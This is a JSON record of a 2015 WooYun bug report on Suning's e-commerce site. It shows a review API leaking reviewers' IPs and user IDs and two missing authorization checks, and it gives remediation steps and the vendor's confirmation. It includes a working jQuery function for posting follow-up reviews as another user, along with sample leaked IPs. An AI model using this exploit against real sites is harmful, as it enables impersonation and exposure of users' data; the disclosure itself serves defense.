{"id": 34003, "wybug_id": "wooyun-2015-0108987", "wybug_title": "苏宁易购2处平行权限+1个用户信息泄露（可刷虚假评价）", "wybug_corp": "江苏苏宁易购电子商务有限公司", "wybug_author": "路人甲", "wybug_date": "2015-04-19 13:03", "wybug_open_date": "2015-06-03 16:14", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["用户敏感信息泄露", "平行权限"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向公众公开  简要描述： 苏宁第三方的商品千万不敢给差评了... 详细说明：  获取商品评论信息接口是http://zone.suning.com/review/json/product_reviews/000000000126148820--total-g-810999---3-4-getItem.html?callback=getItem此接口返回的数据格式化后如下\n{  \"success\": true,  \"data\": {    \"reviews\": [      {        \"id\": 55615884,        \"content\": \"速度快，东西好\",        \"contentLength\": 7,        \"replyCount\": 0,        \"usefulVoteCount\": 0,        \"publishIp\": \"223.104.4.103\",        \"publishTime\": \"2015-04-04 18:32:30\",        \"publishDeviceId\": 5,        \"anonymousFlag\": 1,        \"userId\": \"6098337491\",        \"user\": {          \"province\": \"\",          \"birthday\": \"\",          \"constellation\": \"\",          \"id\": \"6098337491\",          \"nickName\": \"1***8\",          \"gender\": \"\",          \"typeId\": \"1\",          \"imageUrl\": \"http://image.suning.cn/uimg/cmf/cust_headpic/0000000000_01_60x60.jpg\",          \"levelId\": \"161000000010\",          \"levelName\": \"普通会员\"        },        \"status\": 0,        \"score\": 5,        \"bestFlag\": false,        \"storeFlag\": false,        \"storeId\": \"SN_001\",        \"store\": {          \"id\": \"SN_001\",          \"name\": \"苏宁自营\"        },        \"againReviewFlag\": false,        \"showOrderFlag\": false,        \"productId\": \"000000000126148820\",        \"product\": {          \"name\": \"亚马逊Kindle voyage 6英寸高级电子书阅读器 标准版 墨水屏 黑色\",          \"oldId\": \"25474860\",          \"brandId\": \"00005G950\",          \"brandName\": \"亚马逊(amazon)\",          \"imageCount\": 0,          \"firstCategoryId\": \"157122\",          \"secondCategoryId\": \"258003\",          \"thirdCategoryId\": \"258006\",          \"purchaseCategory\": \"10051\",          \"id\": \"000000000126148820\"        },        \"replyList\": [],        \"labels\": [],        \"orderItemId\": 10082295095,        \"supplierName\": \"苏宁自营\",        \"orderTime\": \"2015-04-03 15:58:13\",        \"logonId\": \"139*****18\"      },      {        \"id\": 55611420,        \"content\": \"这个还可以\",        \"contentLength\": 5,        \"replyCount\": 0,        \"usefulVoteCount\": 0,        \"publishIp\": \"61.148.242.67\",        \"publishTime\": \"2015-04-04 15:49:14\",        \"publishDeviceId\": 2,        \"anonymousFlag\": 0,        \"userId\": \"6013127526\",        \"user\": {          \"province\": \"\",          \"birthday\": \"\",          \"constellation\": \"\",          \"id\": \"6013127526\",          \"nickName\": \"186*****37\",          \"gender\": \"\",          \"typeId\": \"1\",          \"imageUrl\": \"http://image.suning.cn/uimg/cmf/cust_headpic/0000000000_01_60x60.jpg\",          \"levelId\": \"161000000010\",          \"levelName\": \"普通会员\"        },        \"status\": 0,        \"score\": 5,        \"bestFlag\": false,        \"storeFlag\": false,        \"store\": {          \"id\": \"SN_001\",          \"name\": \"苏宁自营\"        },        \"againReviewFlag\": false,        \"showOrderFlag\": false,        \"productId\": \"000000000126148820\",        \"product\": {          \"name\": \"亚马逊Kindle voyage 6英寸高级电子书阅读器 标准版 墨水屏 黑色\",          \"oldId\": \"25474860\",          \"brandId\": \"00005G950\",          \"brandName\": \"亚马逊(amazon)\",          \"imageCount\": 0,          \"firstCategoryId\": \"157122\",          \"secondCategoryId\": \"258003\",          \"thirdCategoryId\": \"258006\",          \"purchaseCategory\": \"10051\",          \"id\": \"000000000126148820\"        },        \"replyList\": [],        \"labels\": [],        \"orderItemId\": 99999999999999,        \"logonId\": \"186*****37\"      },      {        \"id\": 55425631,        \"title\": \"\",        \"content\": \"外观精致，体验很舒服。\",        \"contentLength\": 11,        \"replyCount\": 0,        \"usefulVoteCount\": 0,        \"publishIp\": \"171.111.40.70\",        \"publishTime\": \"2015-04-02 01:12:07\",        \"publishDeviceId\": 1,        \"anonymousFlag\": 0,        \"userId\": \"5202247450\",        \"user\": {          \"province\": \"\",          \"birthday\": \"\",          \"constellation\": \"\",          \"id\": \"5202247450\",          \"nickName\": \"139*****22\",          \"gender\": \"\",          \"typeId\": \"1\",          \"imageUrl\": \"http://image.suning.cn/uimg/cmf/cust_headpic/0000000000_01_60x60.jpg\",          \"levelId\": \"161000000010\",          \"levelName\": \"普通会员\"        },        \"status\": 0,        \"score\": 5,        \"bestFlag\": false,        \"storeFlag\": false,        \"storeId\": \"SN_001\",        \"store\": {          \"id\": \"SN_001\",          \"name\": \"苏宁自营\"        },        \"againReviewFlag\": false,        \"showOrderFlag\": false,        \"productId\": \"000000000126148820\",        \"product\": {          \"name\": \"亚马逊Kindle voyage 6英寸高级电子书阅读器 标准版 墨水屏 黑色\",          \"oldId\": \"25474860\",          \"brandId\": \"00005G950\",          \"brandName\": \"亚马逊(amazon)\",          \"imageCount\": 0,          \"firstCategoryId\": \"157122\",          \"secondCategoryId\": \"258003\",          \"thirdCategoryId\": \"258006\",          \"purchaseCategory\": \"10051\",          \"id\": \"000000000126148820\"        },        \"replyList\": [],        \"labels\": [          {            \"id\": \"14127037\",            \"name\": \"待机长\",            \"uniqueId\": \"216\",            \"reviewId\": \"55425631\",            \"status\": 1          }        ],        \"orderItemId\": 4075900887,        \"supplierName\": \"苏宁自营\",        \"orderTime\": \"2015-03-12 00:42:55\",        \"logonId\": \"139*****22\"      }    ],    \"attributes\": {      \"productId\": \"000000000126148820\",      \"nineProductId\": \"126148820\",      \"color\": \"\",      \"version\": \"\",      \"colorList\": [],      \"versionList\": []    }  }}\n其中data['reviews'][0]['id'] 是此条评论的id，data['reviews'][0]['content']是评论内容data['reviews'][0]['publishIp']是评论者IP，data['reviews'][0]['userId']是评论者的UID此接口泄露用户的IP和UID使用UID在http://zone.suning.com/me/review/6098337491.htm 处可以进入该用户的主页，如果该用户有未匿名的评价/晒单会显示出来。接下来是平行权限了http://zone.suning.com/me/self-review/6098337491-1.htm此接口是用户在进入自己主页时调用的，显示自己所有的评价商品，但是没做权限验证，可以直接查看他人的所有评价商品。还可以“追加评价”哟在登录任意账号状态下，调用如下函数即可以其他用户的身份追评【pid是评论id，uid是其他用户的id，ct是评价内容】\nfunction append(pid, uid, ct) {    var aurl = \"http://zone.suning.com/me/ajax/appendReview.htm\";    $.ajax({        url: aurl,        type: \"POST\",        dataType: 'jsonp',        async: false,        data: {            content: ct,            reviewId: pid,            cmfUserId: uid        },        success: {            function (data) {                if (data.returnCode == 0) {                    alert('success');                    return;                } else if (data.returnCode == 2) {                    alert('黑名单用户');                    return;                } else if (data.returnCode == 1) {                    alert('河蟹');                    return;                } else if (data.returnCode == -2) {                    alert('异常');                    return;                }            }        }    });}\n我试了给http://product.suning.com/126148820.html 评价第三页第二个用户追评，在评价页看不到追评内容，但是在用户自己视角下【http://zone.suning.com/me/self-review/6085490581-1.htm】是可以看到追评内容的   漏洞证明：  泄露用户UID和IP就不截图证明了。这个是越权查看uid为6098337491用户所有评论商品的截图[当然，由于该用户只买了kindle，所以截图只有一件商品]\n\n这个是越权在uid为6085490581用户评论里追加评论的截图\n\n   修复方案：  1.在商品评论接口去掉IP字段，以防差评后商家跨省2.在商品评论接口对匿名评价用户去掉uid字段3.对用户查看自己所有评价的页面验证用户权限4.对追加评论，修改匿名状态等接口进行权限验证   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-04-19 16:12 厂商回复： 感谢提交，周一转交应用部门处理。 最新状态： 2015-05-27：稍后送上苏宁易购1000元礼品卡。 2015-06-08：请路人甲站内留下联系方式，以便发放礼品卡，谢谢。  ", "replys": "漏洞评价：\n评论\n     2015-06-03 16:20 |    \t\tsql小神 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 有些漏洞可以提，有些漏洞不可以提。)\t\t \n  直接给1000元，真好，这个厂商我也要去    \n     2015-06-03 16:32 |    \t\t我能拒绝么 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 疯爆志林)\t\t \n  甲鱼你敢用，小心把你揪出来了    \n     2015-06-03 18:37 |    \t\tllkoio \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | 热爱网络安全！)\t\t \n  周一见！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}